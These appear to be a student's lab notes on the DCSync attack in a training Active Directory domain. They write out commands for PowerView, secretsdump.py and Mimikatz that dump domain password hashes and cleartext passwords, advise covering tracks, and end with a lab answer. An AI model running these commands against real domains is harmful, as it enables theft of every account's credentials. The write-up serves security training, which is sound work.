- Based on our work in the previous section, we now have control over the **user `adunn` who has DCSync privileges in the INLANEFREIGHT.LOCAL** domain.
# What is DCSync and How Does it Work?
---
- DCSync is a **technique for stealing the Active Directory password database by using the built-in `Directory Replication Service Remote Protocol`**, which is used by Domain Controllers to **replicate domain data.**
- This allows **an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.**
- The **==crux of the attack is requesting a Domain Controller to replicate passwords via the `DS-Replication-Get-Changes-All` extended right.==**
- To perform this attack, **you must have control over an account that has the rights to perform domain replication** (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set).
- **==Domain/Enterprise Admins and default domain administrators have this right by default.==**
- It is common during an assessment to **find other accounts that have these rights**, and once compromised, their access can be **utilized to retrieve the current NTLM password hash for any domain user**.

## Using Get-DomainUser to View adunn's Group Membership
- `. .\PowerView.ps1`
- `Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol | fl`
- ![[Pasted image 20250812000858.png]]
- We first **get the user's SID in the above command and then check all ACLs set on the domain object** (`"DC=inlanefreight,DC=local"`) **using [Get-ObjectAcl](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainObjectAcl/) to get the ACLs associated with the object**.

## Using Get-ObjectAcl to Check adunn's Replication Rights
- `$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"`
- `Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl`
- ![[Pasted image 20250812001017.png]]
- If we had **certain rights over the user (such as [WriteDacl](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writedacl))**, we **could also add this privilege to a user under our control, execute the DCSync attack**, and then remove the privileges to attempt to cover our tracks.
- **==DCSync replication can be performed using tools such as Mimikatz, Invoke-DCSync, and Impacketâ€™s secretsdump.py==**. Let's see a few quick examples.

## Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py
- `secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 `
	- The **`-just-dc` flag tells the tool to extract NTLM hashes and Kerberos keys** from the NTDS file.
	- Other useful options **include `-pwd-last-set` to see when each account's password was last changed** and **`-history` if we want to dump password history**
	- The **`-user-status` is another helpful flag to check and see if a user is disabled.**
	- Providing **our client with password cracking statistics** to ensure that data such as:
		- Number and % of passwords cracked
		- top 10 passwords
		- Password length metrics
		- Password re-use
## Viewing an Account with Reversible Encryption Password Storage Set
- When this option is set on a user account, **it does not mean that the passwords are stored in cleartext.**
- Instead, they are ==**stored using RC4 encryption.**==
- The trick here is that the **==key needed to decrypt them is stored in the registry (the [Syskey](https://docs.microsoft.com/en-us/windows-server/security/kerberos/system-key-utility-technical-overview)) and can be extracted by a Domain Admin or equivalent.==**
- Tools such as **`secretsdump.py` will decrypt any passwords stored using reversible encryption while dumping the NTDS file** either as a Domain Admin **or using an attack such as DCSync.**
- If this setting is disabled on an account, a user will need to change their password for it to be stored using one-way encryption

- Enumerating Further using Get-ADUser:
	- `Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl`
	- We can see that one account, **`proxyagent`, has the reversible encryption option set with PowerView as well:**
	- `Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol`
	- ![[Pasted image 20250812001630.png]]
	- We will notice the **tool decrypted the password and provided us with the cleartext value.**
- Displaying the Decrypted Password:
	- `cat inlanefreight_hashes.ntds.cleartext `

## Using Mimikatz
- We can perform the attack with **Mimikatz as well.** Using Mimikatz, **we must target a specific user.** 
- Also it is important to **==note that Mimikatz must be ran in the context of the user who has DCSync privileges==**. 
- We can **utilize `runas.exe` to accomplish** this:
	- `runas /netonly /user:INLANEFREIGHT\adunn powershell`
	- `.\mimikatz.exe`
	- `privilege::debug`
	- `lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator`

# LABS

=>  Perform a DCSync attack and look for another user with the option "Store password using reversible encryption" set. Submit the username as your answer. 
- `Get-ADUser -Filter {AllowReversiblePasswordEncryption -eq "true"} | Select Name, sAMAccountName`
	- `syncron`

=> What is this user's cleartext password? 
- `proxychains impacket-secretsdump -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -just-dc-user syncron`
